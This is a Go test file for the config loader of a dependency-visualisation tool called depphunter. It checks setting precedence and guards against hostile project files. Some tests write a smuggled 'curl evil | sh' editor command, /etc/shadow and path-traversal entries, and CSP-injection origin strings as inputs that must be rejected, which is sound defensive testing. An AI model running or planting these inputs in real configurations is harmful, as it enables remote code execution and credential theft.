package config

import (
	"io"
	"os"
	"path/filepath"
	"slices"
	"testing"
	"time"

	"github.com/spf13/pflag"
)

// resolve is what Load makes of a path: it follows symlinks and expands short names,
// so a temporary directory comes back as /private/var/... on macOS and with the long
// user name on Windows.
func resolve(t *testing.T, p string) string {
	t.Helper()
	r, err := filepath.EvalSymlinks(p)
	if err != nil {
		t.Fatal(err)
	}
	return r
}

// load parses args like the command does and loads the configuration; env is set
// for the duration of the test.
func load(t *testing.T, args []string, env map[string]string, userDir string) (Config, error) {
	t.Helper()
	for k, v := range env {
		t.Setenv(k, v)
	}
	fs := pflag.NewFlagSet("depphunter", pflag.ContinueOnError)
	fs.SetOutput(io.Discard)
	RegisterFlags(fs)
	if err := fs.Parse(args); err != nil {
		return Config{}, err
	}
	return Load(fs, fs.Args(), userDir)
}

func write(t *testing.T, path, content string) {
	t.Helper()
	if err := os.WriteFile(path, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestPrecedence(t *testing.T) {
	root, user := t.TempDir(), t.TempDir()
	write(t, filepath.Join(user, "config.yaml"), "addr: 127.0.0.1:1\nui:\n  theme: dark\n  color_by: size\n  height_scale: log\n")
	write(t, filepath.Join(root, ProjectFile), "addr: 127.0.0.1:2\nui:\n  theme: light\n")
	env := map[string]string{"DEPPHUNTER_ADDR": "127.0.0.1:3", "DEPPHUNTER_EXCLUDE": "*.gen.go"}

	cfg, err := load(t, []string{"--height-scale", "linear", "--exclude", "testdata", root}, env, user)
	if err != nil {
		t.Fatal(err)
	}
	checks := []struct{ name, got, want string }{
		{"addr (env beats project and user)", cfg.Addr, "127.0.0.1:3"},
		{"theme (project beats user)", cfg.UI.Theme, "light"},
		{"color_by (user beats default)", cfg.UI.ColorBy, "size"},
		{"height_scale (flag beats user)", cfg.UI.HeightScale, "linear"},
		{"root", cfg.Root, resolve(t, root)},
	}
	for _, c := range checks {
		if c.got != c.want {
			t.Errorf("%s: got %q, want %q", c.name, c.got, c.want)
		}
	}
	if len(cfg.Exclude) != 2 || cfg.Exclude[0] != "*.gen.go" || cfg.Exclude[1] != "testdata" {
		t.Errorf("exclude: got %v", cfg.Exclude)
	}
}

func TestUnsetFlagsDoNotOverrideFiles(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, ProjectFile), "open: false\nui:\n  show_std: true\n  expand_depth: 3\n")
	cfg, err := load(t, []string{root}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Open || !cfg.UI.ShowStd || cfg.UI.ExpandDepth != 3 {
		t.Errorf("file values lost: %+v", cfg)
	}
}

func TestExplicitConfigMustExist(t *testing.T) {
	_, err := load(t, []string{"--config", filepath.Join(t.TempDir(), "missing.yaml"), t.TempDir()}, nil, "")
	if err == nil {
		t.Fatal("expected an error for a missing --config file")
	}
}

func TestValidation(t *testing.T) {
	_, err := load(t, []string{"--theme", "neon", t.TempDir()}, nil, "")
	if err == nil {
		t.Fatal("expected invalid theme to be rejected")
	}
}

func TestWatchCacheEditorAndExport(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, ProjectFile), "watch: true\n")
	env := map[string]string{"DEPPHUNTER_CACHE": "false", "DEPPHUNTER_EDITOR": "subl {file}:{line}"}
	cfg, err := load(t, []string{"--export", "dot", "-o", "g.dot", root}, env, "")
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.Watch || cfg.Cache || cfg.Editor != "subl {file}:{line}" || cfg.Export != "dot" || cfg.Output != "g.dot" {
		t.Errorf("unexpected config: %+v", cfg)
	}
	if _, err := load(t, []string{"--export", "svg", root}, nil, ""); err == nil {
		t.Error("unknown export format accepted")
	}
	if _, err := load(t, []string{"-o", "x", root}, nil, ""); err == nil {
		t.Error("-o without --export accepted")
	}
}

func TestProjectConfigCannotChooseEditor(t *testing.T) {
	root, user := t.TempDir(), t.TempDir()
	write(t, filepath.Join(user, "config.yaml"), "editor: code -g {file}:{line}\n")
	write(t, filepath.Join(root, ProjectFile), "editor: sh -c 'curl evil | sh' {file}\n")
	cfg, err := load(t, []string{root}, nil, user)
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Editor != "code -g {file}:{line}" {
		t.Errorf("project config set editor to %q", cfg.Editor)
	}
}

func TestHistorySettings(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, ProjectFile), "history_commits: 500\nui:\n  color_by: churn\n")
	cfg, err := load(t, []string{root}, map[string]string{"DEPPHUNTER_HISTORY": "false"}, "")
	if err != nil {
		t.Fatal(err)
	}
	if cfg.History || cfg.HistoryCommits != 500 || cfg.UI.ColorBy != "churn" {
		t.Errorf("unexpected config: %+v", cfg)
	}
	if _, err := load(t, []string{"--history-commits", "0", root}, nil, ""); err == nil {
		t.Error("history-commits 0 accepted")
	}
}

func TestLSPSettings(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, ProjectFile), "lsp: true\n"+"lsp_timeout: 90s\n")
	cfg, err := load(t, []string{root}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.LSP || cfg.LSPTimeout != 90*time.Second {
		t.Errorf("unexpected config: lsp %v timeout %v", cfg.LSP, cfg.LSPTimeout)
	}
}

func TestNegatedFlagsAndNewEnv(t *testing.T) {
	root := t.TempDir()
	write(t, filepath.Join(root, ProjectFile), "open: true\nhistory_commits: 50\n")
	env := map[string]string{"DEPPHUNTER_HISTORY_COMMITS": "70", "DEPPHUNTER_LSP_TIMEOUT": "2m", "DEPPHUNTER_EXPAND_DEPTH": "-1"}
	cfg, err := load(t, []string{"--no-open", "--no-cache", root}, env, "")
	if err != nil {
		t.Fatal(err)
	}
	if cfg.Open || cfg.Cache || !cfg.History {
		t.Errorf("--no-* flags: open %v cache %v history %v", cfg.Open, cfg.Cache, cfg.History)
	}
	if cfg.HistoryCommits != 70 || cfg.LSPTimeout != 2*time.Minute || cfg.UI.ExpandDepth != -1 {
		t.Errorf("env: history_commits %d lsp_timeout %v expand_depth %d", cfg.HistoryCommits, cfg.LSPTimeout, cfg.UI.ExpandDepth)
	}
	if _, err := load(t, []string{root}, map[string]string{"DEPPHUNTER_OPEN": "maybe"}, ""); err == nil {
		t.Error("invalid boolean in the environment accepted")
	}
}

func TestSymlinkedRootAndPaths(t *testing.T) {
	dir := t.TempDir()
	link := filepath.Join(t.TempDir(), "link")
	if err := os.Symlink(dir, link); err != nil {
		t.Skip("symlinks unavailable:", err)
	}
	cfg, err := load(t, []string{link}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	want := resolve(t, dir)
	if cfg.Root != want || cfg.ConfigFile != filepath.Join(want, ProjectFile) {
		t.Errorf("root %q config %q, want %q", cfg.Root, cfg.ConfigFile, want)
	}
	if _, err := load(t, []string{dir, dir}, nil, ""); err == nil {
		t.Error("two paths accepted")
	}
}

// TestEveryFlagIsBound catches the mistake of registering a flag and forgetting to
// give it a setting: the flag then parses, prints in --help, and changes nothing.
func TestEveryFlagIsBound(t *testing.T) {
	// The flags that act on their own instead of setting a value. exclude, findings,
	// private and trust-index add to what the configuration already holds rather than
	// replacing it, so Load appends them itself; embed is read straight off the flag
	// set because no file and no variable may turn it on
	// (TestEmbedComesFromTheCommandLineOnly); ui-default sets a default rather than a
	// value, which is a layer under everything a binding would reach
	// (TestUIDefaultsAreBeatenByTheProjectFile).
	standalone := map[string]bool{
		"config": true, "export": true, "output": true, "exclude": true, "findings": true,
		"private": true, "trust-index": true,
		"embed": true, "help": true, "version": true, "ui-default": true,
	}
	fs := pflag.NewFlagSet("test", pflag.ContinueOnError)
	RegisterFlags(fs)
	fs.VisitAll(func(f *pflag.Flag) {
		if standalone[f.Name] {
			return
		}
		if _, ok := flagKeys[f.Name]; ok {
			return
		}
		if _, ok := negatedFlags[f.Name]; ok {
			return
		}
		t.Errorf("--%s is registered but bound to no setting", f.Name)
	})
}

func TestOnlineSettings(t *testing.T) {
	root := t.TempDir()
	cfg, err := load(t, []string{"--online", root}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.Online {
		t.Error("--online did not reach the configuration")
	}
	// A repository does not get to decide that this machine goes on the network.
	write(t, filepath.Join(root, ProjectFile), "online: true\nresolve_depth: 2\n")
	if cfg, err = load(t, []string{root}, nil, ""); err != nil {
		t.Fatal(err)
	}
	if cfg.Online {
		t.Error("the project config turned on network access")
	}
	if cfg.ResolveDepth != 2 {
		t.Errorf("resolve_depth from the project config is %d", cfg.ResolveDepth)
	}
}

func TestFindingsSettings(t *testing.T) {
	root := t.TempDir()
	cfg, err := load(t, []string{"--findings", "reports/trivy.json", "--findings", "audit.json", root}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if len(cfg.Findings) != 2 || cfg.Findings[0] != "reports/trivy.json" || cfg.Findings[1] != "audit.json" {
		t.Errorf("findings %v", cfg.Findings)
	}
	if !cfg.Vulns || !cfg.FindingsEnabled() {
		t.Errorf("vulns %t, enabled %t", cfg.Vulns, cfg.FindingsEnabled())
	}

	// What makes a run look for findings at all. The link check needs nothing but the
	// repository, so a plain run does look; the two switches turn off one source
	// each, and only together do they turn the whole thing off.
	for _, c := range []struct {
		args []string
		want bool
		why  string
	}{
		{[]string{root}, true, "a plain run follows the documentation's links"},
		{[]string{"--no-links", root}, false, "nothing is read or asked without reports, --online or links"},
		{[]string{"--online", root}, true, "--online asks the vulnerability database"},
		{[]string{"--online", "--no-vulns", root}, true, "--no-vulns leaves the link check"},
		{[]string{"--no-vulns", "--no-links", root}, false, "both off asks nothing"},
		{[]string{"--online", "--no-vulns", "--no-links", root}, false, "both off asks nothing, online or not"},
	} {
		cfg, err := load(t, c.args, nil, "")
		if err != nil {
			t.Fatal(err)
		}
		if cfg.FindingsEnabled() != c.want {
			t.Errorf("%v: enabled %t, want %t (%s)", c.args, cfg.FindingsEnabled(), c.want, c.why)
		}
	}
}

// TestLinkSettings checks the three ways of turning the link check off, and that it
// is on without being asked for: it needs nothing but the repository.
func TestLinkSettings(t *testing.T) {
	root := t.TempDir()
	cfg, err := load(t, []string{root}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.Links {
		t.Error("the link check is off by default")
	}
	if cfg, err = load(t, []string{"--no-links", root}, nil, ""); err != nil {
		t.Fatal(err)
	}
	if cfg.Links {
		t.Error("--no-links did not reach the configuration")
	}
	if cfg, err = load(t, []string{root}, map[string]string{"DEPPHUNTER_LINKS": "false"}, ""); err != nil {
		t.Fatal(err)
	}
	if cfg.Links {
		t.Error("DEPPHUNTER_LINKS did not reach the configuration")
	}
	write(t, filepath.Join(root, ProjectFile), "links: false\n")
	if cfg, err = load(t, []string{root}, nil, ""); err != nil {
		t.Fatal(err)
	}
	if cfg.Links {
		t.Error("links in the project config did not reach the configuration")
	}
}

// Which paths a repository may name is a question about a file that travels between
// systems, so it is answered the same way on all of them - which is what makes this
// table worth having on every platform rather than only on the one that would break.
func TestInside(t *testing.T) {
	for _, tc := range []struct {
		path string
		want bool
	}{
		{"reports/trivy.json", true},
		{"reports\\trivy.json", true},
		{"./a/../b.json", true},
		{"", false},
		{"/etc/shadow", false},          // rooted on POSIX; on Windows, not absolute
		{"\\etc\\shadow", false},        // ... and the same path the other way round
		{"C:\\Windows\\win.ini", false}, // a drive letter, on either system
		{"c:/windows/win.ini", false},
		{"\\\\server\\share\\report.json", false}, // a UNC share
		{"../../elsewhere/report.json", false},
		{"..\\..\\elsewhere\\report.json", false},
		{"..", false},
		{"reports/../../out.json", false},
	} {
		if got := inside(tc.path); got != tc.want {
			t.Errorf("inside(%q) = %v, want %v", tc.path, got, tc.want)
		}
	}
}

// A repository may point at reports it ships; it may not point at files outside itself.
func TestProjectConfigFindingsStayInsideTheRepository(t *testing.T) {
	root := t.TempDir()
	project := "findings:\n  - reports/trivy.json\n  - /etc/shadow\n  - 'C:\\Windows\\win.ini'\n" +
		"  - ../../elsewhere/report.json\n  - ''\nvulns: true\n"
	if err := os.WriteFile(filepath.Join(root, ProjectFile), []byte(project), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg, err := load(t, []string{root}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if len(cfg.Findings) != 1 || cfg.Findings[0] != "reports/trivy.json" {
		t.Errorf("findings %v, want only the path inside the repository", cfg.Findings)
	}

	// Named with --config, the same file is the user's own choice.
	trusted, err := load(t, []string{"--config", filepath.Join(root, ProjectFile), root}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Contains(trusted.Findings, "/etc/shadow") {
		t.Errorf("a file the user named lost entries: %v", trusted.Findings)
	}
}

func TestStyleSettings(t *testing.T) {
	root := t.TempDir()
	cfg, err := load(t, []string{root}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if cfg.UI.Style != "city" {
		t.Errorf("default style %q, want city", cfg.UI.Style)
	}
	for _, style := range []string{"city", "circuit", "galaxy"} {
		cfg, err := load(t, []string{"--style", style, root}, nil, "")
		if err != nil {
			t.Fatalf("--style %s: %v", style, err)
		}
		if cfg.UI.Style != style {
			t.Errorf("--style %s reached the configuration as %q", style, cfg.UI.Style)
		}
	}
	if _, err := load(t, []string{"--style", "swamp", root}, nil, ""); err == nil {
		t.Error("an unknown style was accepted")
	}
	// The browser may leave it out; the default takes over rather than failing.
	if err := (UI{Theme: "auto", ColorBy: "language", HeightScale: "sqrt"}).Validate(); err != nil {
		t.Errorf("an unset style was rejected: %v", err)
	}
}

// --embed relaxes what the server otherwise refuses outright - it lets another origin
// put the map in a frame of its own - so it comes from the command line and nowhere
// else. A config file or an environment variable that could turn it on would be a
// way for a repository, or something that once set a variable, to arrange for the
// map to be framed by a page of its choosing.
func TestEmbedComesFromTheCommandLineOnly(t *testing.T) {
	root, user := t.TempDir(), t.TempDir()
	write(t, filepath.Join(user, "config.yaml"), "embed: [https://evil.test]\n")
	write(t, filepath.Join(root, ProjectFile), "embed: [https://worse.test]\n")
	cfg, err := load(t, []string{root}, map[string]string{"DEPPHUNTER_EMBED": "https://worst.test"}, user)
	if err != nil {
		t.Fatal(err)
	}
	if len(cfg.Embed) != 0 {
		t.Errorf("embed came from somewhere other than a flag: %v", cfg.Embed)
	}

	cfg, err = load(t, []string{"--embed", "vscode-webview:", "--embed", "https://example.test:8080", root}, nil, user)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Equal(cfg.Embed, []string{"vscode-webview:", "https://example.test:8080"}) {
		t.Errorf("embed from flags: %v", cfg.Embed)
	}
}

// What lands in a security header is checked before it gets there, so nothing passed
// on the command line can end the frame-ancestors directive early or start another.
func TestEmbedOriginsAreChecked(t *testing.T) {
	for _, origin := range []string{
		"vscode-webview:", "https://example.test", "https://example.test:8080",
		"http://127.0.0.1:1234", "https://*.vscode-cdn.net",
	} {
		if !frameOrigin(origin) {
			t.Errorf("frameOrigin(%q) = false, want true", origin)
		}
	}
	for _, origin := range []string{
		"", "example.test", "vscode-webview", "'self'", "*", "https://*",
		"https://a.test; script-src *", "https://a.test 'unsafe-inline'",
		"https://a.test/path", "https://", "https://a.*.test", "https://a.test:",
		"https://a.test:80x", "1https://a.test", "a:b:c",
	} {
		if frameOrigin(origin) {
			t.Errorf("frameOrigin(%q) = true, want false", origin)
		}
	}
	if _, err := load(t, []string{"--embed", "'self'", t.TempDir()}, nil, ""); err == nil {
		t.Error("a bare CSP keyword was accepted as an origin")
	}
}

func TestPrivatePatternsCollectFromEverywhere(t *testing.T) {
	root, user := t.TempDir(), t.TempDir()
	write(t, filepath.Join(user, "config.yaml"), "private:\n  - corp.example/*\n")
	// A repository may say which of its own packages are internal: all that can do
	// is stop depphunter naming them to somebody else, and the repository is who
	// would know.
	write(t, filepath.Join(root, ProjectFile), "private:\n  - npm:@acme/*\n")
	cfg, err := load(t, []string{"--private", "oci:harbor.corp/*", root},
		map[string]string{"DEPPHUNTER_PRIVATE": "maven:com.acme.*,pypi:acme-*"}, user)
	if err != nil {
		t.Fatal(err)
	}
	for _, want := range []string{"npm:@acme/*", "oci:harbor.corp/*", "maven:com.acme.*", "pypi:acme-*"} {
		if !slices.Contains(cfg.Private, want) {
			t.Errorf("%q did not reach the configuration: %v", want, cfg.Private)
		}
	}
}

func TestProjectConfigCannotVouchForAnIndex(t *testing.T) {
	// The marking exists because a repository's word for its own registry is not
	// enough - that is the shape dependency confusion takes. A repository that could
	// clear its own warning would leave no guard at all.
	root, user := t.TempDir(), t.TempDir()
	write(t, filepath.Join(user, "config.yaml"), "trust_indexes:\n  - https://nexus.corp/npm\n")
	write(t, filepath.Join(root, ProjectFile), "trust_indexes:\n  - https://evil.example/npm\n")
	cfg, err := load(t, []string{root}, nil, user)
	if err != nil {
		t.Fatal(err)
	}
	if slices.Contains(cfg.TrustIndexes, "https://evil.example/npm") {
		t.Errorf("a project config vouched for its own index: %v", cfg.TrustIndexes)
	}
	if !slices.Contains(cfg.TrustIndexes, "https://nexus.corp/npm") {
		t.Errorf("the user's own config was dropped with it: %v", cfg.TrustIndexes)
	}
	// ... and the command line is the user speaking, so it is heard.
	flagged, err := load(t, []string{"--trust-index", "https://artifactory.corp/api/npm/npm", root}, nil, user)
	if err != nil {
		t.Fatal(err)
	}
	if !slices.Contains(flagged.TrustIndexes, "https://artifactory.corp/api/npm/npm") {
		t.Errorf("--trust-index did not reach the configuration: %v", flagged.TrustIndexes)
	}
}

// TestExplainSettings checks the three ways of asking for the resolution report.
// Unlike online, a repository may ask for it: all it can do is make depphunter say
// more about its own resolution, on the terminal of whoever ran it.
func TestExplainSettings(t *testing.T) {
	root := t.TempDir()
	cfg, err := load(t, []string{"--explain", root}, nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if !cfg.Explain {
		t.Error("--explain did not reach the configuration")
	}
	if cfg, err = load(t, []string{root}, map[string]string{"DEPPHUNTER_EXPLAIN": "true"}, ""); err != nil {
		t.Fatal(err)
	}
	if !cfg.Explain {
		t.Error("DEPPHUNTER_EXPLAIN did not reach the configuration")
	}
	write(t, filepath.Join(root, ProjectFile), "explain: true\n")
	if cfg, err = load(t, []string{root}, nil, ""); err != nil {
		t.Fatal(err)
	}
	if !cfg.Explain {
		t.Error("explain in the project config did not reach the configuration")
	}
}

// A seed says what a repository should look like before anyone has said otherwise in
// it, and never after. This is the whole reason --ui-default exists beside --theme:
// the editor sets these, and the map's own Save button writes the project file, so a
// seed that beat the file would make Save quietly stop working.
func TestUIDefaultsAreBeatenByTheProjectFile(t *testing.T) {
	root := t.TempDir()
	seeds := []string{
		"--ui-default", "theme=dark",
		"--ui-default", "color_by=churn",
		"--ui-default", "expand_depth=3",
		"--ui-default", "show_std=true",
	}

	// With nothing saved, the seed is what the view opens at.
	cfg, err := load(t, append(append([]string{}, seeds...), root), nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if cfg.UI.Theme != "dark" || cfg.UI.ColorBy != "churn" || cfg.UI.ExpandDepth != 3 || !cfg.UI.ShowStd {
		t.Errorf("a seed did not reach an unsaved view: %+v", cfg.UI)
	}

	// Once the repository has a view of its own, the seed is beneath it.
	write(t, filepath.Join(root, ProjectFile), "ui:\n  theme: light\n  color_by: size\n  expand_depth: 1\n  show_std: false\n")
	cfg, err = load(t, append(append([]string{}, seeds...), root), nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if cfg.UI.Theme != "light" || cfg.UI.ColorBy != "size" || cfg.UI.ExpandDepth != 1 || cfg.UI.ShowStd {
		t.Errorf("a seed overruled what the repository had saved: %+v", cfg.UI)
	}

	// ... and a flag still beats both, because that is what a flag is for.
	cfg, err = load(t, append(append([]string{}, seeds...), "--theme", "auto", root), nil, "")
	if err != nil {
		t.Fatal(err)
	}
	if cfg.UI.Theme != "auto" {
		t.Errorf("--theme lost to the file it is meant to override: %q", cfg.UI.Theme)
	}
}

// A pair that cannot be understood is refused rather than dropped: a seed is set in an
// editor's settings and never seen again, so silence is the one answer that leaves
// somebody wondering why their view is not what they asked for.
func TestUIDefaultsRefuseWhatTheyCannotSeed(t *testing.T) {
	root := t.TempDir()
	for _, bad := range []string{"theme", "=dark", "hide_languages=go", "show_std=maybe", "expand_depth=deep"} {
		if _, err := load(t, []string{"--ui-default", bad, root}, nil, ""); err == nil {
			t.Errorf("--ui-default %q was accepted", bad)
		}
	}
}
